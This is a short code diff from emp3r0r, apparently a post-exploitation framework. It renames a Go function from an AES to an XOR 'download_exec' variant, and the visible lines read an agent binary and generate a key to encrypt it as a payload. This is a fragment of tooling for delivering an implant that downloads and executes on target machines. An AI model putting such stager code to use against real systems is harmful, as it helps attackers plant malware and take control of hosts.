@@ -8,7 +8,7 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
 
-func python_http_aes_download_exec(agent_bin_path, url string) (ret []byte) {
+func python_http_xor_download_exec(agent_bin_path, url string) (ret []byte) {
 	// encrypt payload (agent binary)
 	key := tun.GenAESKey(util.RandStr(10))
 	fdata, err := os.ReadFile(agent_bin_path)
